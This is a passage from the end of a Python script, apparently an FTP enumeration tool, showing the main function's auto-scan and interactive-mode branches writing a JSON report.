            enumerate_ftp(host, port, user, passwd, args.timeout, use_tls, prefer_mlsd, report)
        
        log("Auto scan complete!", "success")
        if args.json_out:
            with open(args.json_out, "w") as f:
                json.dump(report, f, indent=2)
        if args.report:
            with open(args.report, "w") as f:
                f.write(json.dumps(report, indent=2))
        return
    
    # Interactive mode
    interactive_menu(host, port, use_tls, args.timeout, prefer_mlsd, report)
    if args.json_out:
        with open(args.json_out, "w") as f:
            json.dump(report, f, indent=2)

if __name__ == "__main__":
    main()
